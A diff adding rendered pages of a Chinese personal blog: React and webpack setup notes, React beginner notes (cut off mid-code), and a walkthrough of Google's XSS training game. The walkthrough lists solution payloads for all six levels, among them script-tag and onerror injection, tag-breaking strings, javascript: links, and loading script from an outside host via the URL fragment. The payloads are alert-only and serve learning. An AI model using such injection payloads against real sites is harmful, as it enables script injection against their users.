@@ -318,6 +318,625 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/24/React-入门笔记（二）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Albert">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Albert's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/24/React-入门笔记（二）/" itemprop="url">React 入门笔记（二）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-24T17:55:42+08:00">
+                2017-09-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/react/" itemprop="url" rel="index">
+                    <span itemprop="name">react</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            <!--noindex-->
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/09/24/React-入门笔记（二）/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count hc-comment-count" data-xid="2017/09/24/React-入门笔记（二）/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+              <!--/noindex-->
+            
+          
+
+          
+          
+             <span id="/2017/09/24/React-入门笔记（二）/" class="leancloud_visitors" data-flag-title="React 入门笔记（二）">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="React-入门笔记（二）"><a href="#React-入门笔记（二）" class="headerlink" title="React 入门笔记（二）"></a>React 入门笔记（二）</h1><blockquote>
+<p>笔记概要：</p>
+<ol>
+<li>CND 引用跑起一个 hello world react 实例；</li>
+<li>webpack 搭建一个撸React 的开发环境；</li>
+</ol>
+</blockquote>
+<hr>
+<blockquote>
+<p>基础模块：</p>
+<ol>
+<li>babel-cli</li>
+<li>babel-preset-react</li>
+<li>react</li>
+<li>react-dom</li>
+<li>babel-preset-es2015</li>
+<li>babel-loader</li>
+</ol>
+</blockquote>
+<hr>
+<blockquote>
+<p>开发模块：</p>
+<ol>
+<li>html-webpack-plugin</li>
+<li>webpack-dev-server</li>
+<li>HMR 热替换 + react-hot-loader</li>
+</ol>
+<p>其他模块：根据自己需求添加 如 devtool : “source-map” 等</p>
+</blockquote>
+<hr>
+<h2 id="零、初探"><a href="#零、初探" class="headerlink" title="零、初探"></a>零、初探</h2><p>新建一个入口文件</p>
+<p>新建一个js ==&gt; hello world</p>
+<p>引入 CDN</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;script src=&quot;https://unpkg.com/react@15/dist/react.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;script src=&quot;https://unpkg.com/react-dom@15/dist/react-dom.min.js&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>npm 安装 babel ==&gt; babel-cli babel-preset-react</p>
+<p>npm script ==&gt; ./node_modules/.bin/babel –presets react src –out-dir build –watch</p>
+<h2 id="一、webpack-构建开发环境"><a href="#一、webpack-构建开发环境" class="headerlink" title="一、webpack 构建开发环境"></a>一、webpack 构建开发环境</h2><h3 id="1-安装基础模块"><a href="#1-安装基础模块" class="headerlink" title="1. 安装基础模块"></a>1. 安装基础模块</h3><p>已有模块：<br>babel-cli<br>babel-preset-react</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"build": "./node_modules/.bin/babel --presets react src --out-dir build --watch"</div></pre></td></tr></table></figure>
+<p>继续安装：<br>react<br>react-dom<br>babel-preset-es2015<br>babel-loader</p>
+<ul>
+<li><code>.babelrc</code> 配置，管理 babel<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="attr">"presets"</span>:[</div><div class="line">    [<span class="string">"es2015"</span>,&#123;<span class="attr">"modules"</span>:<span class="literal">false</span>&#125;],</div><div class="line">    <span class="string">"react"</span></div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>npm script ==&gt; “dev”:”webpack –config webpack.dev.js”</p>
+<ul>
+<li><code>webpack.dev.js</code><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">"path"</span>);</div><div class="line"><span class="keyword">const</span> root = __dirname;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">    <span class="comment">// 入口文件</span></div><div class="line">    entry: path.resolve(root, <span class="string">"src/main.js"</span>),</div><div class="line">    <span class="comment">// 出口文件</span></div><div class="line">    output: &#123;</div><div class="line">        filename: <span class="string">"bundle.js"</span>,</div><div class="line">        path: path.resolve(root, <span class="string">"dist"</span>)</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// loaders</span></div><div class="line">    <span class="built_in">module</span>: &#123;</div><div class="line">        rules: [</div><div class="line">            &#123;</div><div class="line">                test: <span class="regexp">/\.js[x]?$/</span>,</div><div class="line">                use: [<span class="string">"babel-loader"</span>],</div><div class="line">                exclude: <span class="regexp">/node_modules/</span></div><div class="line">            &#125;,</div><div class="line">        ]</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这个时候已经能跑起来了，但是不够自动化，下面再给 webpack 新增一些配置</p>
+<h3 id="2-html-webpack-plugin"><a href="#2-html-webpack-plugin" class="headerlink" title="2. html-webpack-plugin"></a>2. html-webpack-plugin</h3><p>说明书：<a href="https://doc.webpack-china.org/plugins/html-webpack-plugin" target="_blank" rel="external">https://doc.webpack-china.org/plugins/html-webpack-plugin</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 引入html-webpack-plugin</span></div><div class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>)</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  <span class="comment">// ...</span></div><div class="line">  <span class="comment">// 其他配置保持不变</span></div><div class="line">  <span class="comment">// ...</span></div><div class="line">  plugins: [</div><div class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</div><div class="line">      title: <span class="string">'React Demo'</span>,</div><div class="line">      template: path.resolve(root, <span class="string">'template.html'</span>)</div><div class="line">    &#125;)</div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="3-webpack-dev-server"><a href="#3-webpack-dev-server" class="headerlink" title="3. webpack-dev-server"></a>3. webpack-dev-server</h3><p>说明书：<a href="https://doc.webpack-china.org/guides/development/#-webpack-dev-server" target="_blank" rel="external">https://doc.webpack-china.org/guides/development/#-webpack-dev-server</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">    <span class="comment">// 入口文件</span></div><div class="line">    entry: [</div><div class="line">        <span class="string">"webpack-dev-server/client"</span>,</div><div class="line">        path.resolve(root, <span class="string">"src/main.js"</span>)</div><div class="line">    ],</div><div class="line">    <span class="comment">// 出口文件</span></div><div class="line">    output: &#123;</div><div class="line">        filename: <span class="string">"bundle.js"</span>,</div><div class="line">        path: path.resolve(root, <span class="string">"dist"</span>),</div><div class="line">        publicPath: <span class="string">"/"</span></div><div class="line">    &#125;,</div><div class="line">    devServer: &#123;</div><div class="line">        contentBase: path.resolve(root, <span class="string">"dist"</span>),</div><div class="line">        publicPath: <span class="string">"/"</span>,</div><div class="line">        port: <span class="string">"3030"</span>,</div><div class="line">        historyApiFallback: <span class="literal">true</span></div><div class="line">    &#125;,</div></pre></td></tr></table></figure></p>
+<p>package.json<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"dev": "webpack-dev-server --config webpack.dev.js"</div></pre></td></tr></table></figure></p>
+<h2 id="HMR-热替换"><a href="#HMR-热替换" class="headerlink" title="HMR 热替换"></a>HMR 热替换</h2><p>说明书：<a href="https://doc.webpack-china.org/guides/hot-module-replacement" target="_blank" rel="external">https://doc.webpack-china.org/guides/hot-module-replacement</a></p>
+<h3 id="babelrc"><a href="#babelrc" class="headerlink" title=".babelrc"></a>.babelrc</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="attr">"presets"</span>:[</div><div class="line">    [<span class="string">"es2015"</span>,&#123;<span class="attr">"modules"</span>:<span class="literal">false</span>&#125;],</div><div class="line">    <span class="string">"react"</span></div><div class="line">  ],</div><div class="line">  <span class="attr">"plugins"</span>:[</div><div class="line">    <span class="string">"react-hot-loader/babel"</span></div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="react-hot-loader"><a href="#react-hot-loader" class="headerlink" title="react-hot-loader"></a>react-hot-loader</h3><p>安装模块 ==&gt; npm i -D react-hot-loader</p>
+<p>说明书：<a href="https://github.com/gaearon/react-hot-loader" target="_blank" rel="external">https://github.com/gaearon/react-hot-loader</a></p>
+<p>修改 webpack.dev.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">entry: [</div><div class="line">    <span class="string">"react-hot-loader/patch"</span>,</div><div class="line">    <span class="string">"webpack-dev-server/client"</span>,</div><div class="line">    <span class="string">"webpack/hot/only-dev-server"</span>,</div><div class="line">    path.resolve(root, <span class="string">"src/main.js"</span>)</div><div class="line">],</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// 其他没变</span></div><div class="line"><span class="comment">//</span></div><div class="line">devServer: &#123;</div><div class="line">    hot: <span class="literal">true</span>,</div><div class="line">    contentBase: path.resolve(root, <span class="string">"dist"</span>),</div><div class="line">    publicPath: <span class="string">"/"</span>,</div><div class="line">    port: <span class="string">"3030"</span>,</div><div class="line">    historyApiFallback: <span class="literal">true</span></div><div class="line">&#125;,</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// 其他没变</span></div><div class="line"><span class="comment">//</span></div><div class="line">plugins: [</div><div class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</div><div class="line">        title: <span class="string">"React Demo"</span>,</div><div class="line">        template: path.resolve(root, <span class="string">"template.html"</span>)</div><div class="line">    &#125;),</div><div class="line">    <span class="keyword">new</span> webpack.HotModuleReplacementPlugin(),</div><div class="line">    <span class="keyword">new</span> webpack.NamedModulesPlugin()</div><div class="line">]</div></pre></td></tr></table></figure></p>
+<p>main.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span></div><div class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span></div><div class="line"><span class="keyword">import</span> &#123;AppContainer&#125; <span class="keyword">from</span> <span class="string">'react-hot-loader'</span></div><div class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App'</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> render = <span class="function">(<span class="params">App</span>) =&gt;</span> &#123;</div><div class="line">    ReactDOM.render(</div><div class="line">        &lt;AppContainer&gt;</div><div class="line">            &lt;App/&gt;</div><div class="line">        &lt;<span class="regexp">/AppContainer&gt;,</span></div><div class="line"><span class="regexp">        document.getElementById('app')</span></div><div class="line"><span class="regexp">    )</span></div><div class="line"><span class="regexp">&#125;;</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">render(App);</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">if (module.hot) &#123;</span></div><div class="line"><span class="regexp">    module.hot.accept('./</span>App<span class="string">', () =&gt; render(App))</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure></p>
+<p>然后修改 App.js 里的内容自己调试</p>
+<p>（完）</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/24/一个模拟-XSS-攻击的小游戏/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Albert">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Albert's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/24/一个模拟-XSS-攻击的小游戏/" itemprop="url">一个模拟 XSS 攻击的小游戏</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-24T16:52:28+08:00">
+                2017-09-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HTTP/" itemprop="url" rel="index">
+                    <span itemprop="name">HTTP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            <!--noindex-->
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/09/24/一个模拟-XSS-攻击的小游戏/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count hc-comment-count" data-xid="2017/09/24/一个模拟-XSS-攻击的小游戏/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+              <!--/noindex-->
+            
+          
+
+          
+          
+             <span id="/2017/09/24/一个模拟-XSS-攻击的小游戏/" class="leancloud_visitors" data-flag-title="一个模拟 XSS 攻击的小游戏">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="一个模拟-XSS-攻击的小游戏"><a href="#一个模拟-XSS-攻击的小游戏" class="headerlink" title="一个模拟 XSS 攻击的小游戏"></a>一个模拟 XSS 攻击的小游戏</h1><blockquote>
+<p>游戏地址 xss-game : <a href="https://xss-game.appspot.com/" target="_blank" rel="external">https://xss-game.appspot.com/</a></p>
+<p>由简到难一共六关，覆盖了绝大多数的 XSS 攻击方法，挺有意思的，玩游戏的同时帮助你学习了解 XSS 攻击原理</p>
+</blockquote>
+<h3 id="1-直接写-script-标签"><a href="#1-直接写-script-标签" class="headerlink" title="1. 直接写 script 标签"></a>1. 直接写 <code>script</code> 标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;script&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-图片加载失败触发-onerror-方法"><a href="#2-图片加载失败触发-onerror-方法" class="headerlink" title="2. 图片加载失败触发 onerror 方法"></a>2. 图片加载失败触发 <code>onerror</code> 方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// XSS 注入</div><div class="line">&lt;img src = &quot;asd&quot; onerror=&quot;alert(1)&quot; &gt;</div></pre></td></tr></table></figure>
+<h3 id="3-强行闭合标签"><a href="#3-强行闭合标签" class="headerlink" title="3. 强行闭合标签"></a>3. 强行闭合标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">// 在地址栏会显示图片锚点（用拼接 html 方式组合图片）</div><div class="line">&lt;img src=&apos;123.jpg&apos;&gt;</div><div class="line">// http://xxx.xxx.xxx#123</div><div class="line"></div><div class="line">// XSS 强行闭合标签</div><div class="line">&apos;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<h3 id="4-找到页面中-submit-方法触发-onload-方法的地方"><a href="#4-找到页面中-submit-方法触发-onload-方法的地方" class="headerlink" title="4. 找到页面中 submit 方法触发 onload 方法的地方"></a>4. 找到页面中 <code>submit</code> 方法触发 <code>onload</code> 方法的地方</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// submit 3</span></div><div class="line">onload=<span class="string">"startTimer('3');"</span></div><div class="line"></div><div class="line"><span class="comment">// xss 强行闭合</span></div><div class="line"><span class="number">3</span><span class="string">');alert('</span><span class="number">1</span></div></pre></td></tr></table></figure>
+<h3 id="5-寻找-a-标签跳转-观察地址栏-串改-href-触发-javascript"><a href="#5-寻找-a-标签跳转-观察地址栏-串改-href-触发-javascript" class="headerlink" title="5. 寻找 a 标签跳转 观察地址栏 串改 href 触发 javascript"></a>5. 寻找 <code>a</code> 标签跳转 观察地址栏 串改 href 触发 javascript</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// normal</div><div class="line">// https://xss-game.appspot.com/level5/frame/signup?next=confirm</div><div class="line">&lt;a href = &quot;confirm&quot; &gt;</div><div class="line"></div><div class="line">// xss</div><div class="line">// 修改 ==&gt; https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1) ==&gt; 转到</div><div class="line">// 然后 a 标签自动串改</div><div class="line">&lt;a href = &quot;javascript:alert(1)&quot; &gt;</div></pre></td></tr></table></figure>
+<h3 id="6-修改-query-参数"><a href="#6-修改-query-参数" class="headerlink" title="6. 修改 query 参数"></a>6. 修改 query 参数</h3><ul>
+<li>查看 query string 参数 </li>
+<li>分析 html 中的 javascript 代码 </li>
+<li>自己做一个 js xss 攻击文件，放在自己服务器</li>
+<li>替换 query 参数指向自己的攻击文件</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// https://xss-game.appspot.com/level6/frame#/static/gadget.js</span></div><div class="line"><span class="comment">// 下面是当前页面中的某条源码</span></div><div class="line"><span class="keyword">if</span> (url.match(<span class="regexp">/^https?:\/\//</span>)) &#123;</div><div class="line"></div><div class="line"><span class="comment">// xss</span></div><div class="line"><span class="comment">// 查看提示 google 提供一个 api </span></div><div class="line"><span class="comment">// google.com/jsapi?callback=foo</span></div><div class="line"><span class="comment">// 拉到最后发现执行了一个 foo() </span></div><div class="line"><span class="comment">// 替换成 xss 攻击函数</span></div><div class="line"><span class="comment">// google.com/jsapi?callback=alert("xss")</span></div><div class="line"><span class="comment">// 替换原始 url </span></div><div class="line"><span class="comment">// https://xss-game.appspot.com/level6/frame#//google.com/jsapi?callback=alert("xss")</span></div></pre></td></tr></table></figure>
+<h3 id="最后是通关奖励"><a href="#最后是通关奖励" class="headerlink" title="最后是通关奖励"></a>最后是通关奖励</h3><p><img src="https://ws1.sinaimg.cn/large/889b2f7fgy1fjuqr9gmubj21hc0qd77d.jpg" alt="@通关奖励 - 一张破图 | center | 0 "></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/24/React-入门笔记（一）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Albert">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Albert's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/24/React-入门笔记（一）/" itemprop="url">React 入门笔记（一）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-24T00:58:28+08:00">
+                2017-09-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/react/" itemprop="url" rel="index">
+                    <span itemprop="name">react</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            <!--noindex-->
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/09/24/React-入门笔记（一）/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count hc-comment-count" data-xid="2017/09/24/React-入门笔记（一）/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+              <!--/noindex-->
+            
+          
+
+          
+          
+             <span id="/2017/09/24/React-入门笔记（一）/" class="leancloud_visitors" data-flag-title="React 入门笔记（一）">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="React-入门笔记（一）"><a href="#React-入门笔记（一）" class="headerlink" title="React 入门笔记（一）"></a>React 入门笔记（一）</h1><blockquote>
+<p>入门笔记，没有排版格式。</p>
+</blockquote>
+<h2 id="jsx"><a href="#jsx" class="headerlink" title="jsx"></a>jsx</h2><ul>
+<li>数组 插入</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> jsx3 = [<span class="string">'i'</span>,<span class="string">'love'</span>,<span class="string">'react'</span>].map(<span class="function">(<span class="params">name</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">return</span> &lt;div&gt;&#123;name&#125;&lt;/div&gt;</div><div class="line">&#125;);</div><div class="line">render(</div><div class="line">    &lt;div&gt;&#123;jsx3&#125;&lt;<span class="regexp">/div&gt;,</span></div><div class="line"><span class="regexp">     RootDom</span></div><div class="line"><span class="regexp">);</span></div></pre></td></tr></table></figure>
+<hr>
+<h2 id="component"><a href="#component" class="headerlink" title="component"></a>component</h2><ul>
+<li><code>pure functional component</code> 从不修改它的 <code>props</code></li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//  * pure functional components </span></div><div class="line"><span class="keyword">const</span> A = <span class="function">(<span class="params">props</span>)=&gt;</span>&#123;</div><div class="line">    <span class="keyword">return</span> &lt;div&gt;&#123;props.gender &#125; + &#123;props.name&#125;&lt;/div&gt;</div><div class="line">&#125;;</div><div class="line">render(&lt;A gender='male' name='slashhuang'/&gt;,RootDom);</div></pre></td></tr></table></figure>
+<ul>
+<li><code>class component</code> 必须有 <code>render</code> 方法</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// CALSS COMPONENT</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FirstComponent</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</div><div class="line">    <span class="keyword">constructor</span>()&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        <span class="keyword">this</span>.state = &#123;</div><div class="line">            b: <span class="number">1</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    render()&#123;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                I am a component</div><div class="line">                &#123;<span class="keyword">this</span>.state.b&#125;</div><div class="line">            &lt;<span class="regexp">/div&gt;);</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp"> &#125;;</span></div><div class="line"><span class="regexp"></span></div><div 